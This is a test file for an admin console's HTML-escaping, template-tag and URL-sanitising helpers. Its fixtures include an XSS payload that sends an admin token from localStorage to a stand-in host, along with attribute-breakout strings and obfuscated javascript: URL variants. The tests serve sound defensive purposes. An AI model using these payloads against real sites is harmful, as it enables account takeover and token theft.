import { describe, expect, test } from "bun:test";
import { escapeHtml, html, safeUrl } from "../../public/admin-escape.js";

// Spec: every value that reaches the admin console HTML is either escaped for HTML
// text AND attribute context (& < > " '), or it is a fragment produced by html``.
// URLs placed in src/href only keep https:, relative paths, data:image and blob:.

describe("escapeHtml", () => {
  test("escapes the five HTML metacharacters", () => {
    expect(escapeHtml(`<a href="x" title='y'>&</a>`)).toBe("&lt;a href=&quot;x&quot; title=&#39;y&#39;&gt;&amp;&lt;/a&gt;");
  });

  test("neutralises the payload the public subscribe form accepts", () => {
    const payload = "<img/src/onerror=fetch('//evil.example/'+localStorage.mazl_admin_token)>@a.bc";
    const out = escapeHtml(payload);
    expect(out).not.toContain("<");
    expect(out).not.toContain(">");
    expect(out).not.toContain("'");
  });

  test("a value cannot break out of a double-quoted attribute", () => {
    const out = escapeHtml('" onmouseover="alert(1)');
    expect(out).not.toContain('"');
  });

  test("escapes text exactly once", () => {
    expect(escapeHtml("a & b")).toBe("a &amp; b");
    expect(escapeHtml("&lt;")).toBe("&amp;lt;");
  });

  test("null and undefined are empty, numbers are text", () => {
    expect(escapeHtml(null)).toBe("");
    expect(escapeHtml(undefined)).toBe("");
    expect(escapeHtml(0)).toBe("0");
    expect(escapeHtml(12.5)).toBe("12.5");
    expect(escapeHtml(false)).toBe("false");
  });
});

describe("html template tag", () => {
  test("escapes every interpolated string", () => {
    const hostile = "<script>alert(1)</script>";
    expect(String(html`<td>${hostile}</td>`)).toBe("<td>&lt;script&gt;alert(1)&lt;/script&gt;</td>");
  });

  test("escapes inside attributes", () => {
    const out = String(html`<img alt="${'" onerror="alert(1)'}">`);
    expect(out).toBe('<img alt="&quot; onerror=&quot;alert(1)">');
  });

  test("does not escape a nested fragment twice, but escapes its own values", () => {
    const row = (name: string) => html`<li>${name}</li>`;
    expect(String(html`<ul>${row("<b>")}</ul>`)).toBe("<ul><li>&lt;b&gt;</li></ul>");
  });

  test("flattens arrays of fragments and of strings", () => {
    const items = ["a", "<b>"].map((x) => html`<i>${x}</i>`);
    expect(String(html`<p>${items}</p>`)).toBe("<p><i>a</i><i>&lt;b&gt;</i></p>");
    expect(String(html`<p>${["<", ">"]}</p>`)).toBe("<p>&lt;&gt;</p>");
  });

  test("a plain string that merely looks like a fragment is still escaped", () => {
    const lookalike = { toString: () => "<b>x</b>", __html: "<b>x</b>" };
    expect(String(html`<p>${lookalike as unknown as string}</p>`)).toBe("<p>&lt;b&gt;x&lt;/b&gt;</p>");
    expect(String(html`<p>${"<b>x</b>"}</p>`)).toBe("<p>&lt;b&gt;x&lt;/b&gt;</p>");
  });

  test("false, null and undefined render nothing, so `cond && html` works", () => {
    const cond = false as boolean;
    expect(String(html`<p>${cond && html`<b>x</b>`}${null}${undefined}</p>`)).toBe("<p></p>");
    expect(String(html`<p>${0}</p>`)).toBe("<p>0</p>");
  });

  test("assigning the fragment to innerHTML stringifies it", () => {
    expect(`${html`<b>${"<"}</b>`}`).toBe("<b>&lt;</b>");
  });
});

describe("safeUrl", () => {
  test.each([
    "https://example.com/photo.jpg",
    "/media/photos/3?exp=1&sig=abc",
    "photos/3.jpg",
    "blob:https://admin.example.com/3f2a",
    "data:image/png;base64,iVBORw0KGgo=",
    "data:image/jpeg;base64,/9j/4AAQ",
  ])("keeps %s", (url) => {
    expect(safeUrl(url)).toBe(url);
  });

  test.each([
    "javascript:alert(1)",
    "  javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "\u0001javascript:alert(1)",
    "vbscript:msgbox(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "data:image/svg+xml;base64,PHN2Zy8+",
    "http://example.com/a.jpg",
    "//evil.example/a.jpg",
    "\\\\evil.example\\a.jpg",
    "file:///etc/passwd",
    "",
  ])("drops %j", (url) => {
    expect(safeUrl(url)).toBe("");
  });

  test("non-strings are dropped", () => {
    expect(safeUrl(null)).toBe("");
    expect(safeUrl(undefined)).toBe("");
    expect(safeUrl(42)).toBe("");
    expect(safeUrl({ toString: () => "javascript:alert(1)" })).toBe("");
  });
});

